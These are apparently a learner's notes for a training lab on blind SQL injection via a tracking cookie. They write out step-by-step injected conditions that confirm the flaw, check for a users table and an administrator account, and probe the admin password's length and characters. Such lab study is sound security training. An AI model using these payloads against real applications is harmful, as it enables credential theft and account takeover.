#Lab 11 - Blind SQL injection with condition response

## Vulnerable parameter - tracking cookie

End Goals: 
1) Enumerate the password of the administrator
2) Login as the admininstrator

Analysis:
----------

1) Confirm that the paramter is vulnerable to the blind SQLi

select tracking-id from tracking-table where trackingId = '<trackingId>'

-> If this tracking id exists -> query returns value -> Welcome back message
-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back msg



select tracking-id from tracking-table where trackingId = '<trackingId>' and 1=1--'
	-> TRUE -> Welcome back


select tracking-id from tracking-table where trackingId = '<trackingId>' and 1=0--'
	-> FALSE -> no Welcome back	

2) Confirm that we have a users table

select tracking-id from tracking-table where trackingId = '<trackingId>' and (select 'x' from users LIMIT 1)='x'--' 
	-> TRUE -> Welcome back	-> users table exists in the database.

3) Confirm that username admininstrator exist users table

select tracking-id from tracking-table where trackingId = '<trackingId>' and (select username from users where username='administrator')='administrator'--' 
	-> TRUE -> Welcome back	-> administrator username exists in the database.	

4) Enumerate the password of the administrator user

select tracking-id from tracking-table where trackingId = '<trackingId>' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--' 	
	-> password is exactly 20 characters



select tracking-id from tracking-table where trackingId = '<trackingId>' and (select substring(password,1,1) from users where username='administrator')='a'--' 